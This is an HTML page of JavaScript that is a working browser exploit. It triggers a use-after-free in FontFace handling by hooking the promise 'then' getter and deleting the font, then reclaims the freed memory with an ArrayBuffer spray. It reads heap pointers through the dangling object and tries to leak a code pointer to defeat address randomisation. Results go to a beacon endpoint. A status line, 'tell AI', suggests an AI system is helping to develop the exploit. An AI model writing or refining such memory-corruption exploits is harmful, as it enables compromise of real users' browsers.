<style>

<body>
<div id="bn">P1321 — featherweight timer leak. Fresh-open each try (no auto-reload).</div>
<div id="log"></div>
<script>
'use strict';
var LOG=document.getElementById('log'),BN=document.getElementById('bn'),_c=0;
function S(x,col){BN.textContent=x;BN.style.background=col||'#1b2330';}
function kls(s){s=(''+s).toLowerCase();if(/win|code-ptr/.test(s))return'win';if(/hit|ok|dangling/.test(s))return'ok';if(/err|miss|fail|crash|zero/.test(s))return'bad';return'';}
function row(t,d,c){_c++;var r=document.createElement('div');r.className='r '+(c||'');r.innerHTML="<span class='n'>"+_c+"</span> <span class='t'>"+(''+t).replace(/[<>&]/g,'')+"</span>"+(d?" <span>"+(''+d).replace(/[<>&]/g,'')+"</span>":"");LOG.appendChild(r);while(LOG.childNodes.length>24)LOG.removeChild(LOG.firstChild);}
function B(tag,data){row(tag,data,kls(tag+' '+(data||'')));try{var s=(''+(data||'')).replace(/[^A-Za-z0-9._-]/g,'_').slice(0,300);var u='/beacon.php?tag=P1321-'+encodeURIComponent(tag);if(data)u+='&data='+encodeURIComponent(s);u+='&t='+Date.now();var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}}
window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,70)+'@'+l);};
B('VER','1');

function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}
var buf=null,L1=null,L2=null,W=null,K=32,fired=false,sp=[],fs=null;

try{var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});document.fonts.add(vf);void vf.loaded;
 fs=document.createElement('style');fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';document.head.appendChild(fs);}catch(e){B('SETUP-ERR',(''+e).slice(0,40));}
Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
 if(fired)return undefined;fired=true;
 try{if(fs){fs.textContent='';fs.remove();}}catch(e){}try{document.fonts.delete(this);}catch(e){}fs=null;try{document.body.offsetHeight;}catch(e){}
 for(var k=0;k<K;k++){var w=new Uint8Array(new ArrayBuffer(192));w[0x82]=3;w[3]=0x80;var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;sp.push(w);}
 return undefined;},set:function(){}});
try{document.fonts.load('1em vf, v1','AB').then(function(f){window.__lf=f;setTimeout(scan,80);},function(){setTimeout(scan,80);});}catch(e){B('LOAD-ERR',(''+e).slice(0,40));}
setTimeout(function(){if(!buf)scan();},450);

function scan(){
 if(buf)return;var hit=-1;
 for(var i=0;i<sp.length;i++){var a=le(sp[i],0x58);if(a>0x1000000000n&&a<0x8000000000n){L1=a;L2=le(sp[i],0x68);buf=sp[i];hit=i;break;}}
 if(hit<0){B('MISS','no reclaim — CLOSE+REOPEN for a fresh try');S('miss — fresh-open to retry','#4a2a12');return;}
 B('HIT','L1=0x'+L1.toString(16));
 /* confirm dangling wrapper */
 var cands=[];if(window.__lf)for(var i=0;i<window.__lf.length;i++)cands.push(window.__lf[i]);
 buf[0x82]=4;for(var i=0;i<cands.length;i++){var st='';try{st=''+cands[i].status;}catch(e){}if(st==='error'){W=cands[i];break;}}
 buf[0x82]=3;
 if(!W){B('NOT-DANGLE','fresh-open to retry');S('not dangling — fresh-open','#4a2a12');return;}
 B('DANGLING-OK','');S('dangling — one timer attempt…','#0c7a3a');
 /* ONE timer-start attempt: status=Loading + load() ; read buf[0x90] region */
 function dump(lbl){var parts=[],win=false;for(var off=0x88;off<0xB0;off+=8){var v=le(buf,off);if(v!==0n){var k=(v>=0x1000000000n&&v<0x9000000000n)?'heap':(v<0x100000n?'sm':'CODE?');parts.push('0x'+off.toString(16)+'=0x'+v.toString(16)+'['+k+']');if(k==='CODE?'){win=true;B('CODE-PTR','WIN @0x'+off.toString(16)+'=0x'+v.toString(16)+' (timer vtable=.text!)');S('CODE PTR !!! tell AI','#0a7a2a');}}}B('T-'+lbl,parts.length?parts.join(' '):'0x90 zero');return win;}
 dump('base');
 buf[0x82]=1;try{var p=W.load();if(p&&p.then)p.then(function(){},function(){});B('LOAD','ok');}catch(e){B('LOAD-ERR',(''+(e&&e.message||e)).slice(0,40));}
 dump('after');
 setTimeout(function(){dump('delayed');B('DONE','');S('done — press run button','#1b2330');},250);
}
</script>
